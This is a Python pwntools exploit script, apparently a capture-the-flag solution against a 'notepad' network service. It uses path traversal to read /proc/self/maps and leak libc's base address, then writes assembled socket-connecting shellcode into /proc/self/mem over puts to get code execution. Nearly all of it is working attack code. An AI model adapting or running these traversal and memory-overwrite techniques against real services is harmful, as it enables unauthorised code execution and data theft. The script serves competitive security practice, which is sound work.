from pwn import *
import sys

context.os = "linux"
context.arch = 'amd64'
lib = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

def get_pow(prefix:str, diff=22):
    p = process(["python3", "../pow_solver.py", prefix, str(diff)])
    ans = p.recvline()[:-1]
    p.close()
    return ans

def log_in(register=True):
    # register
    if(register):
        r.recvuntil(b"> ")
        r.sendline(b"2")
        r.recvuntil(b"Username: ")
        r.sendline(b"123")
        r.recvuntil(b"Password: ")
        r.sendline(b"123")

    # login
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Username: ")
    r.sendline(b"123")
    r.recvuntil(b"Password: ")
    r.sendline(b"123")

def read_file_128(filename: bytes, offset=0):
    # ../../../ + ./ * 44 + etc/passwd
    path = b'../../../'
    path += b"./" * (49 - len(filename) // 2)
    if(len(filename) % 2 == 1):
        path += b"/"
    path += filename

    # do openfile
    r.recvuntil(b"> ")
    r.sendline(b"5")
    r.recvuntil(b"Note Name: ")
    r.sendline(path)
    r.recvuntil(b"Offset: ")
    r.sendline(str(offset).encode())
    
    firstline = b"+==========      Notepad       ==========+"
    res = r.recvuntil(firstline)[:-1 * len(firstline)]
    return res

def read_file(filename: bytes):
    content = ""
    offset = 0
    print("[read_file]: ", filename.decode())
    while(True):
        res = read_file_128(filename, offset)
        if(res == b"Read note failed.\n"
        or res == b"Couldn't open the file.\n"):
            break
        content += res.decode()
        print(res.decode(), end="")
        offset += 128
    return content    
    
def write_file(filename:bytes, content:bytes, offset=0):
    path = b'../../../'
    path += b"./" * (49 - len(filename) // 2)
    if(len(filename) % 2 == 1):
        path += b"/"
    path += filename

    # do openfile
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Note Name: ")
    r.sendline(path)
    # lseek
    r.recvuntil(b"Offset: ")
    r.sendline(str(offset).encode())
    r.recvuntil(b"Content Length: ")
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.sendline(content)


def get_shellcode():
    shell_socket = '''
        xor rdi, rdi
        mov dil, 2
        xor rsi, rsi
        mov sil, 1
        xor rdx, rdx
        xor rax, rax
        mov al, 0x29
        syscall
        mov r8, rax
    '''
    shell_connect = '''
        mov rdi, r8
        xor rdx, rdx
        mov dl, 0x10

        xor rax, rax
        mov al, 0x2a
        
        xor r9, r9
        push r9
        mov rsi, 0xffffffffffffffff
        mov r9, 0xfeffff80c2ddfffd
        sub rsi, r9
        push rsi
        mov rsi, rsp
        syscall
    '''
    shell_write_CmdFlag = '''   
        xor r9, r9
        mov r9w, 0x8787
        push r9
        
        mov rdi, r8
        mov rsi, rsp
        xor rdx, rdx 
        mov dl, 0xa4
        xor rax, rax 
        mov al, 1
        syscall
    ''' 
    shell_read_Flag = '''
        xor rax, rax
        mov rdi, r8
        mov rsi, rsp
        xor rdx, rdx
        mov dx, 0x0104
        syscall
    '''
    shell_write_stdout = '''   
        xor rdi, rdi
        mov dil, 1
        mov rsi, rsp
        xor rdx, rdx 
        mov dl, 0x40
        xor rax, rax 
        mov al, 1
        syscall
    ''' 
    shellcode = shell_socket + shell_connect + shell_write_CmdFlag + shell_read_Flag + shell_write_stdout
    return shellcode

if __name__ == '__main__':
    service_port = 0
    r = None
    # if not solve yet, solve pow
    if(len(sys.argv) != 2):
        # nc 10.113.184.121 10044
        r = remote("10.113.184.121", 10044)
        r.recvline() # Solve the proof of work to continue the challenge.
        r.recvuntil(b"sha256(")
        prefix = r.recvuntil(b" +")[:-2].decode()
        print("Prefix:", prefix)
        r.recvline()

        # send pow
        ans = get_pow(prefix)
        r.recvuntil(b"Answer: ")
        r.sendline(ans)

        # get service port
        r.recvline()
        r.recvline()
        r.recvuntil(b"Your service is running on port ")
        service_port = int(r.recvline()[:-2])
        print("Service port:", service_port)
        r.close()
    else:
        service_port = int(sys.argv[1])

    # Connect to Service...
    r = remote("10.113.184.121", service_port)
    
    log_in()

    # proc/self/maps --> /home/notepad/notepad
    maps = read_file(b"proc/self/maps")
    # find the address that has r-xp for libc (/usr/lib/x86_64-linux-gnu/libc.so.6)
    maps_line = maps.split('\n')
    libc_base_addr = int(maps_line[7][0:12], 16)

    print(f'libc base = {libc_base_addr}')
    print("puts addr:", hex(libc_base_addr + lib.symbols["puts"]))
    # write shellcode to memory
    shellcode = get_shellcode()

    sc_bytes = asm(shellcode)
    print("sc bytes:", sc_bytes.hex())
    
    # add lots of nop --> slide to shellcode
    total_sc_bytes = sc_bytes + b"\x90" * 0x10
    write_file(b"/proc/self/mem", total_sc_bytes, libc_base_addr + lib.symbols["puts"]) 

    r.interactive()
